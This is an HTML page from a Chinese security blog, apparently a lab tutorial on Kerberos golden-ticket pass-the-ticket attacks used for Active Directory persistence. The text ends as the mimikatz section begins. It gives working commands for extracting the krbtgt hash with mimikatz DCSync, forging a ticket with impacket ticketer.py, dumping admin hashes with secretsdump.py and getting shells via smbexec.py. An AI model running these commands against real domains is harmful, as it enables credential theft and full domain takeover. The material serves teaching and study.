@@ -1,0 +1,1128 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="the notes record by hypnotic">
+      
+      
+        <meta name="author" content="hypnotic">
+      
+      
+        <link rel="canonical" href="https://hypnoticp.github.io/CTF/Intranet_security/Domain_AD/Domain_permission_maintenance_and_post_penetration_password_collection/article1/index.html">
+      
+      
+      
+      
+      <link rel="icon" href="../../../../../icons/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.42">
+    
+    
+      
+        <title>域权限维持之PTT票据传递攻击 - hypnotic的博客</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../assets/stylesheets/main.0253249f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:300,300i,400,400i,700,700i%7CUbuntu+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Ubuntu";--md-code-font:"Ubuntu Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="deep" data-md-color-accent="deep">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#ptt" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../../../../index.html" title="hypnotic的博客" class="md-header__button md-logo" aria-label="hypnotic的博客" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            hypnotic的博客
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              域权限维持之PTT票据传递攻击
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="deep" data-md-color-accent="deep"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="deep" data-md-color-accent="deep"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/hypnoticp/hypnoticp.github.io.git" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    hypnoticp.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../../index.html" class="md-tabs__link">
+        
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../Code_audit/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Code_audit
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../Vulnerability_analysis/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Vulnerability_analysis
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../Tools/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Tools
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../index.html" class="md-tabs__link">
+          
+  
+    
+  
+  CTF
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../SRC/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  SRC
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../Security_devices/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Security_devices
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../../Shell_Scripts/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Shell_Scripts
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../../about.html" class="md-tabs__link">
+        
+  
+    
+  
+  About
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../../../index.html" title="hypnotic的博客" class="md-nav__button md-logo" aria-label="hypnotic的博客" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    hypnotic的博客
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/hypnoticp/hypnoticp.github.io.git" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    hypnoticp.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../index.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../../../Code_audit/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Code_audit
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../../../Vulnerability_analysis/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Vulnerability_analysis
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../../../Tools/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Tools
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../../index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    CTF
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../../../SRC/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    SRC
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../../../Security_devices/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Security_devices
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../../../Shell_Scripts/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Shell_Scripts
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../about.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    About
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+<h1 id="ptt">域权限维持之PTT票据传递攻击<a class="headerlink" href="#ptt" title="Permanent link">&para;</a></h1>
+<p>在学习域的过程中，我们经常会听到黄金票据攻击，白银票据攻击。那么黄金票据攻击和白银票据攻击到底是什么呢？需要说明的是，无论是黄金票据攻击还是白银票据攻击，都是属于<code>票据传递攻击(Pass The Ticket，PTT)</code>，而票据传递攻击是基于 Kerberos 认证的攻击方式。</p>
+<p><strong>黄金票据攻击利用的前提是获得了域内 krbtgt 用户的 NTLM 哈希或 AES Key 值；白银票据攻击利用的前提是获得了域内服务账号的 NTLM 哈希或 AES Key 值。</strong>由于获得域内 krbtgt 用户或服务账号的 NTLM 哈希或 AES Key 值需要高权限，因此票据传递攻击通常用于<strong>域权限维持</strong>。</p>
+<h2 id="golden-ticket">黄金票据(Golden Ticket)攻击<a class="headerlink" href="#golden-ticket" title="Permanent link">&para;</a></h2>
+<p>在 Kerberos 认证过程的 AS-REP 阶段，在经过预认证后，KDC 的 AS 认证服务返回的 TGT 认购权证中加密部分 <code>authorization-data</code> 是使用 krbtgt 密钥加密的，而 <code>authorization-data</code> 中存放着代表用户身份的 PAC，并且在这个阶段 <strong>PAC的 <code>PAC_SERVER_CHECKSUM</code> 签名和 <code>PAC_PRIVSVR_CHECKSUM</code> 签名的密钥都是 krbtgt 密钥</strong>。如图所示是 AS-REQ&amp;AS-REP 的简要流程：</p>
+<p><img alt="截图" src="fe7ddda0b53bd5cd80d9667751c036bc.png" /></p>
+<p>因此，只要我们能拥有 krbtgt 的密钥，就能够伪造高权限的 PAC，然后将其封装在 TGT 认购权证中。客户端再拿着这个 TGT 认购权证以高权限请求任意服务的服务票据！需要说明的是，<strong>使用 krbtgt 密钥生成高权限的 TGT 认购权证这个过程是离线的，不需要连接 KDC。这个攻击过程被称为黄金票据(Golden Ticket)传递攻击</strong>。</p>
+<p>要创建黄金票据，我们需要知道以下信息：</p>
+<ul>
+<li>krbtgt账号的NTLM哈希或AES Key值</li>
+<li>域的SID值</li>
+<li>域名</li>
+<li>要伪造的域用户，一般填写高权限用户，如域管理员</li>
+</ul>
+<p>通过在域控上查询我们得到如下信息：</p>
+<ul>
+<li>krbtgt 哈希：badf5dbde4d4cbbd1135cc26d8200238</li>
+<li>域 sid：S-1-5-21-1313979556-3624129433-4055459191</li>
+<li>域名：xie.com</li>
+<li>域管理员：administrator</li>
+</ul>
+<p>如下，使用mimikatz获得相关信息：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>mimikatz.exe &quot;lsadump::dcsync /domain:xie.com /user:krbtgt /csv&quot; &quot;exit&quot; &gt; 1.txt
+</code></pre></div>
+<p>如图所示，通过 mimikatz 执行相关命令查询到 krbtgt 用户的 NTLM 哈希值。以及通过 whoami /all 命令查询出域的 SID 值。</p>
+<p><img alt="截图" src="802e3a7929369c272c935cdceb389ad0.png" /></p>
+<p>现在我们需要利用这些信息来进行黄金票据传递攻击了。能进行黄金票据传递攻击的工具有很多，这里只介绍使用 impacket、mimikatz 和 CobaltStrike 来进行黄金票据传递攻击。</p>
+<p>实验环境如下：</p>
+<ul>
+<li>域控系统版本：Windows Server 2012R2</li>
+<li>域控主机名：AD01 • 域控 ip：10.211.55.4</li>
+<li>域内主机系统版本：Windows10</li>
+<li>域内主机名：win10</li>
+<li>域内主机 ip：10.211.55.16</li>
+</ul>
+<h3 id="1-impacket">1.使用 impacket 进行攻击<a class="headerlink" href="#1-impacket" title="Permanent link">&para;</a></h3>
+<p>我们可以使用 impacket 下的 ticketer.py 脚本来离线生成黄金票据，然后将票据导入内存中，即可使用 secretsdump.py、smbexec.py 等脚本进行后利用。命令如下：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>#生成黄金票据
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>python3 ticketer.py -domain-sid S-1-5-21-1313979556-3624129433-4055459191 -nthash badf5dbde4d4cbbd1135cc26d8200238 -domain xie.com administrator
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>#导入票据
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>export KRB5CCNAME=administrator.ccache
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>#导出 administrator 用户的哈希
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>python3 secretsdump.py -k -no-pass administrator@AD01.xie.com -dc-ip 10.211.55. 4 -just-dc-user administrator
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>#访问域控 AD01
+<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>python3 smbexec.py -no-pass -k administrator@AD01.xie.com -dc-ip 10.211.55.4
+<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>
+<a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>#访问域内主机 win10
+<a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>python3 smbexec.py -no-pass -k administrator@win10.xie.com -dc-ip 10.211.55.4 -codec gbk
+</code></pre></div>
+<p>如图所示，通过 impacket 进行黄金票据攻击，可以看到已经导出了域管理员administrator 的哈希了。</p>
+<p><img alt="截图" src="b59f0ee0e4fc28601cf90f30116296d0.png" /></p>
+<p>如图所示，通过黄金票据攻击获得了域控 AD01 和域内主机 win10 的最高权限了。</p>
+<p><img alt="截图" src="cad35305bbcd4129faccd264d193074e.png" /></p>
+<p>注：这里需要注意的是，需要先在本地 hosts 文件里面添加目标域控 AD01 对应的 ip。如果要访问其他主机，也需要在 hosts 文件里添加其他主机对应的 ip，如图所示是 hosts 文件：</p>
+<p><img alt="截图" src="9dc4a7313ac2fccf8becd9f44426588b.png" /></p>
+<h3 id="2-mimikatz">2.使用 mimikatz 进行攻击<a class="headerlink" href="#2-mimikatz" title="Permanent link">&para;</a></h3>
+<p>使用 mimikatz 进行攻击的话，攻击机可以是域中的普通机器，也可以不是域中的机器。当攻击机不在域中时，需要将 DNS 服务器设置为域控。</p>
